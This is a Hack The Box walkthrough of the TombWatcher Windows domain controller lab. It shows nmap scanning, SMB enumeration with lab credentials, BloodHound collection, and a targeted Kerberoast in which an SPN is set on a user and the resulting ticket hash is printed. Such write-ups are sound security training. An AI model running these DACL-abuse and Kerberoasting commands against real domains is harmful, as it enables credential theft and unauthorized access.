---
title: TombWatcher
date: 2025-10-11
categories: [HTB Walkthrough]
tags: Windows SMB Kerberoast ADCS CVE TombStoned DACLAbuse
img_path: /assets/HTB/TombWatcher/image1.png
image:
  path: /assets/HTB/TombWatcher/image1.png
---

<table style="width:100%; table-layout:fixed; text-align:center;">
  <tr>
    <th>Machine</th>
    <th>Difficulty</th>
    <th>OS</th>
    <th>Release</th>
    <th></th>
  </tr>
  <tr>
    <td>TombWatcher</td>
    <td>Medium</td>
    <td>Windows</td>
    <td>08 Jun 2025</td>
    <td><img src="/assets/HTB/TombWatcher/logo.png" alt="Logo" width="80"></td>
  </tr>
</table>

**Machine Information**

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

## Recon

Start off with an Nmap Scan:

```
IP=10.10.11.72
                          
# Find open ports (fast full-port scan) and build a comma-separated list
port=$(sudo nmap -p- $IP --min-rate 10000 | grep open | cut -d'/' -f1 | tr '\n' ',' )

# Run an Nmap service/version scan with default scripts against discovered ports
sudo nmap -sC -sV -vv -p $port $IP -oN tombwatcher.scan
```
```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher]
└─$ IP=10.10.11.72
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher]
└─$ port=$(sudo nmap -p- $IP --min-rate 10000 | grep open | cut -d'/' -f1 | tr '\n' ',' )
[sudo] password for kali: 
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher]
└─$ sudo nmap -sC -sV -vv -p $port $IP -oN tombwatcher.scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-08 04:55 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:55
Completed NSE at 04:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:55
Completed NSE at 04:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:55
Completed NSE at 04:55, 0.00s elapsed
Initiating Ping Scan at 04:55
Scanning 10.10.11.72 [4 ports]
Completed Ping Scan at 04:55, 0.23s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 04:55
Scanning dc01.tombwatcher.htb (10.10.11.72) [20 ports]
Discovered open port 139/tcp on 10.10.11.72
Discovered open port 135/tcp on 10.10.11.72
Discovered open port 80/tcp on 10.10.11.72
Discovered open port 445/tcp on 10.10.11.72
Discovered open port 53/tcp on 10.10.11.72
Discovered open port 49704/tcp on 10.10.11.72
Discovered open port 49683/tcp on 10.10.11.72
Discovered open port 3268/tcp on 10.10.11.72
Discovered open port 636/tcp on 10.10.11.72
Discovered open port 5985/tcp on 10.10.11.72
Discovered open port 49666/tcp on 10.10.11.72
Discovered open port 9389/tcp on 10.10.11.72
Discovered open port 593/tcp on 10.10.11.72
Discovered open port 49684/tcp on 10.10.11.72
Discovered open port 49685/tcp on 10.10.11.72
Discovered open port 464/tcp on 10.10.11.72
Discovered open port 49731/tcp on 10.10.11.72
Discovered open port 88/tcp on 10.10.11.72
Discovered open port 49710/tcp on 10.10.11.72
Discovered open port 3269/tcp on 10.10.11.72
Completed SYN Stealth Scan at 04:55, 0.50s elapsed (20 total ports)
Initiating Service scan at 04:55
Scanning 20 services on dc01.tombwatcher.htb (10.10.11.72)
Completed Service scan at 04:56, 58.27s elapsed (20 services on 1 host)
NSE: Script scanning 10.10.11.72.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:56
NSE Timing: About 99.96% done; ETC: 04:56 (0:00:00 remaining)
Completed NSE at 04:57, 40.16s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:57
Completed NSE at 04:57, 2.44s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:57
Completed NSE at 04:57, 0.00s elapsed
Nmap scan report for dc01.tombwatcher.htb (10.10.11.72)
Host is up, received echo-reply ttl 127 (0.22s latency).
Scanned at 2025-06-08 04:55:25 EDT for 102s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-08 09:08:15Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-08T09:09:56+00:00; +12m51s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
|_ssl-date: 2025-06-08T09:09:56+00:00; +12m51s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-08T09:09:56+00:00; +12m51s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
| SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
| -----BEGIN CERTIFICATE-----
| MIIF9jCCBN6gAwIBAgITLgAAAAKKaXDNTUaJbgAAAAAAAjANBgkqhkiG9w0BAQUF
| ADBNMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLdG9tYndh
| dGNoZXIxGTAXBgNVBAMTEHRvbWJ3YXRjaGVyLUNBLTEwHhcNMjQxMTE2MDA0NzU5
| WhcNMjUxMTE2MDA0NzU5WjAfMR0wGwYDVQQDExREQzAxLnRvbWJ3YXRjaGVyLmh0
| YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPkYtnAM++hvs4LhMUtp
| OFViax2s+4hbaS74kU86hie1/cujdlofvn6NyNppESgx99WzjmU5wthsP7JdSwNV
| XHo02ygX6aC4eJ1tbPbe7jGmVlHU3XmJtZgkTAOqvt1LMym+MRNKUHgGyRlF0u68
| IQsHqBQY8KC+sS1hZ+tvbuUA0m8AApjGC+dnY9JXlvJ81QleTcd/b1EWnyxfD1YC
| ezbtz1O51DLMqMysjR/nKYqG7j/R0yz2eVeX+jYa7ZODy0i1KdDVOKSHSEcjM3wf
| hk1qJYZHD+2Agn4ZSfckt0X8ZYeKyIMQor/uDNbr9/YtD1WfT8ol1oXxw4gh4Ye8
| ar0CAwEAAaOCAvswggL3MC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBv
| AG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEw
| DgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCA
| MA4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCG
| SAFlAwQBAjALBglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0O
| BBYEFAqc8X8Ifudq/MgoPpqm0L3u15pvMB8GA1UdIwQYMBaAFCrN5HoYF07vh90L
| HVZ5CkBQxvI6MIHPBgNVHR8EgccwgcQwgcGggb6ggbuGgbhsZGFwOi8vL0NOPXRv
| bWJ3YXRjaGVyLUNBLTEsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIw
| U2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz10b21id2F0
| Y2hlcixEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0aW9uTGlzdD9iYXNlP29iamVj
| dENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHGBggrBgEFBQcBAQSBuTCBtjCB
| swYIKwYBBQUHMAKGgaZsZGFwOi8vL0NOPXRvbWJ3YXRjaGVyLUNBLTEsQ049QUlB
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9dG9tYndhdGNoZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/YmFz
| ZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1UdEQQ5MDeg
| HwYJKwYBBAGCNxkBoBIEEPyy7selMmxPu2rkBnNzTmGCFERDMDEudG9tYndhdGNo
| ZXIuaHRiMA0GCSqGSIb3DQEBBQUAA4IBAQDHlJXOp+3AHiBFikML/iyk7hkdrrKd
| gm9JLQrXvxnZ5cJHCe7EM5lk65zLB6lyCORHCjoGgm9eLDiZ7cYWipDnCZIDaJdp
| Eqg4SWwTvbK+8fhzgJUKYpe1hokqIRLGYJPINNDI+tRyL74ZsDLCjjx0A4/lCIHK
| UVh/6C+B68hnPsCF3DZFpO80im6G311u4izntBMGqxIhnIAVYFlR2H+HlFS+J0zo
| x4qtaXNNmuaDW26OOtTf3FgylWUe5ji5MIq5UEupdOAI/xdwWV5M4gWFWZwNpSXG
| Xq2engKcrfy4900Q10HektLKjyuhvSdWuyDwGW1L34ZljqsDsqV1S0SE
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49683/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49731/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 12m49s, deviation: 2s, median: 12m50s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20899/tcp): CLEAN (Timeout)
|   Check 2 (port 24965/tcp): CLEAN (Timeout)
|   Check 3 (port 61752/udp): CLEAN (Timeout)
|   Check 4 (port 30083/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-08T09:09:16
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:57
Completed NSE at 04:57, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:57
Completed NSE at 04:57, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:57
Completed NSE at 04:57, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.49 seconds
           Raw packets sent: 24 (1.032KB) | Rcvd: 21 (908B)
                                                            
```

The Nmap scan revealed a Windows domain controller `DC01.tombwatcher.htb` with multiple Active Directory-related services open, including Kerberos, LDAP, SMB, and WinRM. It also uses a CA-signed SSL certificate, has SMB signing enabled, and shows a slight time skew.


**Update `/etc/hosts`**

Before proceeding, add the target hostname to your local `/etc/hosts` so name resolution works for the domain names.

```bash
# (optional) generate a hosts file using netexec
netexec smb 10.10.11.72 --generate-hosts-file tombwatcher.host

# append the target IP and hostnames to /etc/hosts
echo "10.10.11.72 dc01.tombwatcher.htb tombwatcher.htb" | sudo tee -a /etc/hosts
```


## Enumeration

### SMB enumeration — list users

With the **valid credentials** provided, start SMB enumeration by listing all users on the target.


```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ nxc smb $IP -u henry  -p  'H3nry_987TGV!' --users

SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.72     445    DC01             Administrator                 2025-04-25 14:56:03 4       Built-in account for administering the computer/domain 
SMB         10.10.11.72     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.72     445    DC01             krbtgt                        2024-11-16 00:02:28 0       Key Distribution Center Service Account 
SMB         10.10.11.72     445    DC01             Henry                         2025-05-12 15:17:03 0        
SMB         10.10.11.72     445    DC01             Alfred                        2025-05-12 15:17:03 0        
SMB         10.10.11.72     445    DC01             sam                           2025-05-12 15:17:03 7        
SMB         10.10.11.72     445    DC01             john                          2025-05-19 13:25:10 3        
SMB         10.10.11.72     445    DC01             [*] Enumerated 7 local users: TOMBWATCHER
                                                                                      
```


Extract all usernames from the SMB output and write them to `username.txt` for later use.

I switched `tee -a` to `> username.txt` (and added `sort -u`) so you get a clean, de-duplicated file each run.


```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup]
└─$ nxc smb $IP -u henry  -p  'H3nry_987TGV!' --users | awk '/^SMB/ && $5 ~ /^[a-zA-Z0-9_.]+$/ { print $5 }' | tee -a username.txt 

Administrator
Guest
krbtgt
Henry
Alfred
sam
john

```

The SMB enumeration shows common administrative and default shares on `DC01` — `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL`.

```
┌──(kali㉿kali)-[~/HTB-machine/tombwatcher]
└─$ nxc smb $IP -u henry  -p  'H3nry_987TGV!' --shares                                    

SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)                                                                                                                                                        
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             [*] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share 
                                                                                                    
```

We have **READ** access to `IPC$`, `NETLOGON`, and `SYSVOL`, but initial inspection revealed **nothing immediately interesting** to escalate from those shares.


### Data Collection

Collect AD data for attack-path analysis (users, groups, sessions, ACLs) with BloodHound:

```
bloodhound-python -dc dc01.tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -c All --zip -ns $IP                                  
```

## DACL Abuses

###  Write SPN

The current account can set an SPN on a target user and then request a service ticket for that SPN — a classic targeted **Kerberoasting** workflow to obtain offline crackable service tickets.


<img src="/assets/HTB/TombWatcher/image2.png" alt="Error Loading Image"/>

1. Sync the time with the DC (Kerberos is time-sensitive):

```
sudo ntpdate $IP
```

2. Assign an SPN to the target user (here `alfred`). This requires the ability to modify the user’s `servicePrincipalName` attribute:

```
bloodyAD -d "tombwatcher.htb" --host "10.10.11.72" -u "henry" -p 'H3nry_987TGV!' set object "alfred" servicePrincipalName -v 'http/anything'
```

3. Request the service ticket(s) for kerberoastable accounts and save them for offline cracking:

```
nxc ldap "10.10.11.72" -d "tombwatcher.htb" -u "henry" -p 'H3nry_987TGV!' --kerberoasting kerberoastables.txt
```
```
                                                                       
┌──(venv)─(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup/targetedKerberoast]
└─$ sudo ntpdate $IP  
[sudo] password for kali: 
2025-06-08 05:33:33.862507 (-0400) +912.542016 +/- 0.112870 10.10.11.72 s1 no-leap
CLOCK: time stepped by 912.542016


┌──(venv)─(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup/targetedKerberoast]
└─$ bloodyAD -d "tombwatcher.htb" --host "10.10.11.72" -u "henry" -p 'H3nry_987TGV!' set object "alfred" servicePrincipalName -v 'http/anything'

[+] alfred's servicePrincipalName has been updated
                                                                                                                                                                                                         
┌──(venv)─(kali㉿kali)-[~/HTB-machine/tombwatcher/writeup/targetedKerberoast]
└─$ nxc ldap "10.10.11.72" -d "tombwatcher.htb" -u "henry" -p 'H3nry_987TGV!' --kerberoasting kerberoastables.txt
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
LDAP        10.10.11.72     389    DC01             Bypassing disabled account krbtgt 
LDAP        10.10.11.72     389    DC01             [*] Total of records returned 1
LDAP        10.10.11.72     389    DC01             sAMAccountName: Alfred memberOf:  pwdLastSet: 2025-05-12 11:17:03.526670 lastLogon:<never>
LDAP        10.10.11.72     389    DC01             $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$6a2be740ac0b71113b8ffb3919f7b94c$be0443ca2aab608571f6cd49f7fdd9ff2a0a39dae21149b4e89fc470e6abaf3e258a4a1a7eb7fa2b266e1175f572d3b3e5615c14a2f17c1d88b5581b8ffeb3519aa1861b31afde60f8892fadce13ec93e23e5b3cb8846e2369a0fa81642584d1e6ec4e3f6c680016baf9be9f94d1df27a9032f7805ee0c03fd81602f9207b2370f82d3fb9ab81e5ac8aaedbd8633ea427b960e32a62a329ca0393028505003e8cee30321caa4e0523471559f7b1ce26ebaa0cdff2f9af9ae8f58905234774255d540b4906e05c4bd994f2e41bed8fbb94ab308a3fa940c48a79b2db5afce4276e5aaecbc3eb13a31219aaf26d610202bcfb7ed6e40c1617e03f60bf51eb59247be94b60298a74788532daeb3516e04af79880ec7e578fde70502f8e31dde10bf54eb9277e4ee009eb9c1f84c81e00d3d68599d6bb346deabe01b1b4b6fd3eb99d9182c0de5b8f7295f87d6f99de1a94345c43d331e521f604c66a362042ba90f960f0a66f0b5bb1cf110e58376ffad25b9d492e0f5133562409058c9f36a7c1eb3cc1209e8cceb81c697e83d4164f612d19605c783c9a045fa9d7578f05502774726d1e6b1c8db4698a79d5e357fb86b8f028a3895d469aaa1f51a0fa3ea029cfc27c3df558e4fe5b08314ea2ee94a1bfcfb118f6646768156ddbda20a103b0b30717b74c51edae0d0937c3f5c823b323a125a41d4f03597ff9e81969dd63dc160c687b478eaf175c9180e0db616a29ab9bf6efb511f26a20da45a762ee011d41d4ef582509aa3c5cb41361b0cdc6b3eeaa7c372ef7a92f8b961afe892b46197d1651fad3e843f05d2c346b1c44794f0407161c8794caf2d224f3c0c6d877e1814a86074388dd0edefd93292c2ae18d381ee2d001701a3f36e56395406045d958a26d44b1880391a17bc1e38dfdc6e78792c67cd25068b9d074034e3e544e97cc7c5dc421c9dea03cb5d303a0655a4f6102ae79080fbc903b12c4193e8169674ffd964d1f0c1ef75fd2a362b4709d2b6abcc73a77a912014b746e01b7ffb17fb83b0cf69d6a200b853bf5989525002faa83baed0fa55d3e38d8a03acb6934d24e2648e99aa858d1e21fb5c5ce76dcc8b5a04ec46eb82c5b590610a26c12bbe2c8e12545c54225501dd5cd0108d15847198fa8cbcdd6c8425fd57ac8de8b3e2